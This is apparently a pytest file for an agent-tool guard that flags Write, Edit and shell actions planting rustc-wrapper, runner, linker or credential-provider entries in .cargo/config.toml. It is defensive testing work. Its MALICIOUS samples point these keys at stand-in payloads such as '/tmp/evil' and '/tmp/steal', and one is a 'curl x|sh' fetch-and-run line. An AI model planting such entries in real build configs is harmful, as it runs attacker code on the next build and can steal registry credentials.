"""Cargo exec-key guard: planting rustc-wrapper/runner/linker/rustc/rustdoc/
credential-provider in .cargo/config.toml (cargo spawns it on the next build)."""
from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None, tool="Write"):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)


def _edit(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "new_string": new})


def _hit(d):
    return d.action != Action.ALLOW and d.rule == RULE


MALICIOUS = [
    '[build]\nrustc-wrapper = "/tmp/evil.sh"\n',
    '[build]\nrustc-workspace-wrapper = ["sh", "-c", "curl x|sh"]\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/evil"\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/evil"\n',
    '[build]\nrustc = "/tmp/fake-rustc"\n',
    '[build]\nrustdoc = "/tmp/fake"\n',
    '[registry]\ncredential-provider = ["/tmp/steal"]\n',
    '[registry]\nglobal-credential-providers = ["/tmp/steal"]\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/evil"]\n',
    '[build]\nrustflags = ["-Clink-arg=-fuse-ld=/tmp/evil"]\n',
    '[target.x]\n"runner" = "/tmp/evil"\n',
    '[build]\nRUSTC-WRAPPER="/tmp/evil"\n',
]


def test_write_malicious_gated():
    for c in MALICIOUS:
        for path in (".cargo/config.toml", ".cargo/config", "/home/u/.cargo/config.toml",
                     "sub/dir/.cargo/config.toml"):
            assert _hit(evaluate(_write(path, c), EMPTY)), (path, c)


def test_default_ask_and_deny_mode():
    ev = _write(".cargo/config.toml", MALICIOUS[0])
    assert evaluate(ev, EMPTY).action == Action.ASK
    assert evaluate(ev, DENY).action == Action.DENY


def test_edit_and_windows_path():
    assert _hit(evaluate(_edit(".cargo/config.toml", 'runner = "x"'), EMPTY))
    assert _hit(evaluate(_write("C:\\proj\\.cargo\\config.toml", MALICIOUS[2]), EMPTY))


def test_benign_config_allowed():
    for c in ['[alias]\nb = "build --release"\n', '[build]\njobs = 4\n',
              '[net]\nretry = 3\n', '[term]\ncolor = "always"\n']:
        assert not _hit(evaluate(_write(".cargo/config.toml", c), EMPTY)), c


def test_other_files_not_gated():
    assert not _hit(evaluate(_write("notes/config.toml", MALICIOUS[0]), EMPTY))
    assert not _hit(evaluate(_write("src/main.rs", 'let runner = "x";'), EMPTY))


def test_shell_writes_gated():
    for cmd in [
        "echo '[build]\nrustc-wrapper=\"/tmp/x\"' >> .cargo/config.toml",
        "printf 'runner = \"/tmp/x\"' > ~/.cargo/config.toml",
        "cat >> .cargo/config.toml <<EOF\n[target.x]\nlinker = \"/tmp/x\"\nEOF",
        "sed -i 's/jobs/rustc-wrapper = \"x\"/' .cargo/config.toml",
    ]:
        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_shell_reads_and_benign_allowed():
    for cmd in ["cat .cargo/config.toml", "cargo build", "grep runner .cargo/config.toml",
                "echo 'jobs = 4' >> .cargo/config.toml"]:
        assert not _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_human_escape_shell_only():
    cmd = "echo 'runner = \"x\"' >> .cargo/config.toml # aegis-allow"
    assert not _hit(evaluate(_shell(cmd), EMPTY))


def test_env_toggle(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _hit(evaluate(_write(".cargo/config.toml", MALICIOUS[0]), EMPTY))


def test_policy_allow_and_off_and_monitor():
    allow = Policy(cargo_exec={"allow": [r"vendored/\.cargo"]})
    assert not _hit(evaluate(_write("vendored/.cargo/config.toml", MALICIOUS[0]), allow))
    assert _hit(evaluate(_write("other/.cargo/config.toml", MALICIOUS[0]), allow))
    assert not _hit(evaluate(_write(".cargo/config.toml", MALICIOUS[0]),
                             Policy(cargo_exec={"mode": "off"})))
    assert not _hit(evaluate(_write(".cargo/config.toml", MALICIOUS[0]),
                             Policy(cargo_exec={"mode": "monitor"})))


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cargo/config.toml https://x.example/c"), EMPTY)
    assert d.action != Action.ALLOW


def test_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("cargo_exec:\n  mode: deny\n")
    assert load_policy(str(tmp_path)).cargo_exec == {"mode": "deny"}
